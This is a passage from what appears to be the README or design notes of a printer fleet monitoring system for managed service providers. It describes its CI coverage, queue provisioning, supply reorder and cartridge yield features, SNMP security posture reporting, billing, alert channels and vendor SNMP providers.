  a Mac**, which is why the defects above were findable at all. CUPS is CUPS: the
  same daemon, the same client tools, the same exit codes, the same translated
  prose, the same `~/.cups/lpoptions` precedence. It stands up a private `cupsd`
  on `/run/cups/cups.sock` — the **default** socket, deliberately, because `sudo`
  scrubs `CUPS_SERVER` and a scheduler anywhere else means the per-user
  default-printer check silently tests nothing — and creates a second account,
  since one account cannot demonstrate that root's default and the console user's
  are different files. What it does *not* reproduce is a Mac: no launchd, no
  `/dev/console`, no `dscl`, no printer. Those stay manual, per
  `deploy/MACOS-CLIENT-TESTING.md`.
- **Queue provisioning converges; it never blindly creates.** The client re-runs
  on every assignment change, service start and poll, so `Add-Printer` on an
  existing queue would mean a crash loop or a swallowed exception hiding real
  failures. Every operation inspects then reconciles, port names are derived
  deterministically (a fresh name per run is how workstations end up with forty
  dead ports), and drift — a re-addressed device, a replaced driver — is
  repaired in place rather than leaving a broken queue beside a new one.
  `reconcile` removes **only** queues matching its `managed_prefix`; an empty
  prefix disables removal entirely rather than deleting everything unrecognised,
  because deleting a user's own printer is how a print tool gets uninstalled.
- **Windows CI covers the seam, and only the seam.**
  `.github/workflows/windows-client.yml` runs `tests/windows/` on a
  `windows-latest` runner against a real spooler; everything above
  `PowerShellRunner` is covered on any platform with a fake. It is path-filtered
  because Windows runner minutes bill at 2× on private repos. A green run does
  **not** prove behaviour against a real printer, domain/GPO interaction with
  `RestrictDriverInstallationToAdministrators`, vendor driver packages, or the
  LocalSystem context (the runner is an elevated user, not SYSTEM) — those stay
  manual, per `deploy/WINDOWS-MSI-TESTING.md`.
- **macOS CI covers the packaging seam, and only that.**
  `.github/workflows/macos-pkg.yml` runs `pkgbuild`/`productbuild` on a
  `macos-latest` runner and then `pkgutil --expand`s the result to assert the
  identifier, the payload and the scripts — because nothing on Linux can produce a
  `.pkg` at all, so without this the whole packaging path would be unverified.
  Path-filtered, and at **10×** billing it is worth being stricter about than the
  Windows job's 2×. Two things about reading it: a green run costs ~20-30s, which
  is normal on an M-series runner with pure-Python wheels and **not** the shape of
  a job that skipped its steps (it was checked); and it does **not** prove the
  install works — the runner has no console session worth loading a LaunchDaemon
  into, so `installer` stays manual per `deploy/MACOS-CLIENT-TESTING.md`. The
  signing step is skipped rather than failed where the Apple secrets are absent,
  because a red X for "no Developer account" teaches people to ignore red Xs.
- **Postgres CI is not path-filtered, and that is deliberate.**
  `.github/workflows/postgres.yml` runs the whole suite against a real
  `postgres:16-alpine` (the same major `docker-compose.yml` defaults to —
  testing a different major answers a different question). Until it existed, CI
  ran only on SQLite, so every Postgres-only path executed for the first time on
  a customer's server: the dialect-guarded BRIN index, `pg_try_advisory_lock`
  leader election (a no-op on SQLite, so the "second worker skips the cycle"
  contract was never once asserted), `pg_dump`/`pg_restore` (both subprocess
  seams were monkeypatched away), and real Alembic runs (SQLite migrates under
  `render_as_batch` and Postgres does not). Writing those tests found **two
  shipped defects immediately** — a fresh `alembic upgrade head` could not build
  the schema at all, and the backup path produced a zero-byte file. Linux runner
  minutes bill at 1×, so the cost discipline behind the Windows (2×) and macOS
  (10×) filters does not apply; and a filter would be actively **wrong**, since
  both defects lived in `central/models.py` and
  `central/dashboard/backup_routes.py` — files no Postgres-shaped path filter
  would plausibly have listed.
  - Three test changes that came with it are **findings, not accommodations**,
    and are the shape to expect when adding coverage on a second dialect:
    Postgres rejects an integer bound into a Boolean *before* evaluating a
    CHECK, so a test binding literal `0` passed for entirely the wrong reason;
    `try_leader_lock`'s SQLite assertions are marked `sqlite_only`, because on
    Postgres the same call reaches the other branch where reentrancy means the
    second session is **refused** — asserting True there asserts the opposite of
    the production contract while looking green; and Postgres runs mark the
    session cookie `Secure`, so a test hardcoding `http` broke.
- **The Docker image's dependency layer is projected from `pyproject.toml`, not
  hand-listed.** The hand-written "fallback" list was never a fallback: with
  only `pyproject.toml` copied, `pip install ".[postgres]"` dies at *"package
  directory central does not exist"*, so that list was the **only** path that
  ever ran — and it had drifted three packages (`authlib`, `cryptography`,
  `tzdata`) from `pyproject`. What covered for it was the other defect,
  `pip install -e . || true`, whose discarded failure quietly resolved
  `[project.dependencies]` anyway. The image was correct exactly as long as a
  step whose failure is explicitly discarded kept succeeding. Both are gone. The
  `-e` is **load-bearing and now asserted**: `pip wheel .` yields 53 entries
  with zero templates and zero static files, so a non-editable install 500s on
  every page.

**Core**: central server, multi-tenant model, push-based agents, brand-agnostic
SNMP, alerting with dedupe + auto-resolve + flap damping, occurrence-rate rules
("10 jams a day") with their own hysteresis and a window-capped cooldown, alert
rule CRUD at `/manage/alert-rules`, quiet hours + maintenance
windows, scheduled reports, friendly names,
days-until-order supply forecasts, per-client / per-site rollups, recent
activity, **fleet-wide printer search** (IP / hostname / serial / asset tag /
model / brand / display name, tenant-scoped **in the WHERE**, `ilike` because
Postgres `LIKE` is case-sensitive and SQLite's is not — a plain `.like()` passes
every SQLite run and fails in production), maintenance schedules, audit log, DB
backup/restore, one-screen onboarding (claim-code self-enrollment,
trusted-subnet auto-approve, bulk approvals, per-client defaults), **readings
retention + daily rollup**, and **collector redundancy** (a standby agent per
subnet behind a lease — see the conventions).

**Supply reorder recommendations** (`/supplies/reorder`, the portal and the
weekly report): "order these N cartridges", triggered on level **OR**
days-remaining **OR** pages-remaining, in two urgency bands. **Recommend-only,
structurally**: the judgement is computed on read from the persisted
measurements and stored nowhere, so there is no row to go stale, a threshold
change takes effect on the next render rather than the next worker cycle, and
"no recommendation exists as a row" is what keeps the boundary from being a
matter of discipline. No SKU catalogue, no inventory, no PO generation, no order
state machine — a human places every order, and an `supply.reorder_recommended`
event lets an MSP's own ERP act on it. If a change starts to need an order
lifecycle, that is the signal it is out of scope.

**Cartridge yield** (`/supplies/yield`, **staff only**): pages actually
delivered per cartridge, measured between one replacement and the next, against
what a cartridge for that model should deliver. A persistent shortfall is the
non-OEM / refill signal — the one thing an MSP cannot otherwise see, because
every individual reading looks entirely normal. Replacements are detected from
the supply level RISING (`supplies.refill_boundaries`, shared with the depletion
forecast), the interval's pages come from the same rollup-then-raw series
billing reads, and expected yield comes from an operator-entered datasheet
figure per model tag or, failing that, the fleet median across *other* printers
of the same model. Presented as **"yield below expected"** with the non-OEM
reading offered as an interpretation next to the things that equally explain it;
the threshold is operator-settable and defaults to a conservative 30% over at
least 3 completed cartridges. Below that it says *insufficient data* and shows
the measurement without a verdict. Two opt-in events
(`supply.replaced`, `supply.yield_below_expected`) let an ERP act on it. See the
conventions for why absence is reported as itself, why the subject printer is
excluded from its own baseline, and why nothing lands in `printer_events`.

**Device security posture** (`/security/posture`, **staff only**, with a CSV
export that enforces the same by 403 rather than by tenant-scoping — an export
the UI refuses to show is a tenancy hole with a filename). The view itself is
old; what it *asserts* was corrected, and all three corrections are the same
shape — **reporting absence as safety**, which is the one thing a security
report must never do. SNMPv3 was graded secure on the version alone, but USM
`noAuthNoPriv` is v3 with authentication *and* privacy off and the agent polls
at exactly that level when no `security_level` is recorded, so an unconfigured
v3 subnet earned a green "authenticated" badge over a cleartext session; graded
three ways now (cleartext / authenticated / encrypted). It flagged every v1/v2c
device "insecure-snmp" in red, which is not a claim we can support — we never
attempt a SET, and HP's Secure by Default refuses writes while answering reads,
so a technician sent to a hardened printer finds nothing and stops believing the
next report; narrowed to `snmp-cleartext`, which says only what we own. And
`firmware-unknown` was counted in `flagged` beside real exposures — "we cannot
see this" and "this is exposed" are different claims, and merging them is how a
security report becomes noise; it is a visibility column with its own counter
now. The one genuinely assertable credential finding needs no inference about
the device at all: `snmp-default-community`, raised when the community in *our
own* subnet row is still a vendor default (v1/v2c only — a leftover `public` on
a v3 subnet is a credential nothing uses). The community string is **never a
column**: "is it a default" is the finding, the value is a live credential, and
this file gets mailed around.

**Billing** (`/manage/billing`, admin-only — a rate card is a customer's
commercial terms, not fleet operations): per-client cost-per-page rate cards with
mono/colour rates, optional graduated volume bands and an optional monthly
minimum, priced over the reading series into invoice-shaped output (preview +
CSV, both audited). Invoices are **derived on demand, never stored** — the meters
are append-only and the card records the terms, so a stored copy is a second
source of truth that drifts the moment a rate is corrected, and doing it honestly
would mean immutability, a numbering series and credit notes. The monthly billing
CSV carries `pages_period`/`mono_period`/`color_period` **beside** the untouched
lifetime meters, over the last complete calendar month.

**Channels**: email (incl. OAuth SMTP / XOAUTH2), Slack, Teams, FreeScout,
generic webhook. Attachments supported on email for reports.

**Vendor providers** (in `agent/printer_nanny_agent/providers/`):
- **Brother** (consolidated): maintenance blob (BRAdmin data path, exact
  percentages from the SNMP private MIB), live alert + history, PJL on
  TCP/9100, EWS HTML scrape. Adds belt/fuser/laser/PF-kit life rows.
- **HP**, **Lexmark** — brand tag, model, front-panel message.
- **Xerox**, **Kyocera**, **Canon**, **Ricoh**, **Konica Minolta** — defensive
  scaffolding (brand tag + front-panel message). Exact private-MIB supply
  decoding extended per-model when a probe lands.

**Device definitions** (`/manage/definitions`): server-pushed, so a new model no
longer needs an agent release. Definitions are validated data — no regex, closed
vocabulary, bounded — served over the existing agent API, signed against the
requesting agent's own credential, cached locally, and applied by a provider that
runs **after** every built-in and fills only what is missing. See the conventions
above for the precedence decision and why the feed is a full set rather than a
delta. Verified end-to-end against a fake SNMP backend on a freshly seeded DB:
the same agent build reports a `-3` "some remaining" bucket before the row exists
and a real 47% after it, with the trace naming the definition on the printer's
detail page.

**Discovery**: SNMP sweep across configured subnets + optional mDNS / Bonjour
(zeroconf, `agent[mdns]` extras) on the agent's local subnet.

**Security**:
- Per-agent API keys hashed at rest, shown once at enrollment, rotatable.
- All operator-managed secrets (SMTP password, OAuth tokens, FreeScout key,
  Slack/Teams/webhook URLs, OIDC client secret, SNMPv3 USM passwords)
  Fernet-encrypted at rest with a `SECRET_KEY`-derived key.
- Audit trail at `/manage/audit`.
- MFA via the configured OIDC IdP (no built-in TOTP).

**Operator surface**: grouped settings (six tabs), agents page with collapsed
discovery + diagnostics, conditional Approvals nav, contextual nav badges,
customer portal for `client_readonly` users. Per-agent **needs-update** badges +
scoped "update outdated" bulk action, and one-click **Windows MSI** builder
(self-contained installer with enrollment baked in, Server 2016→2025).
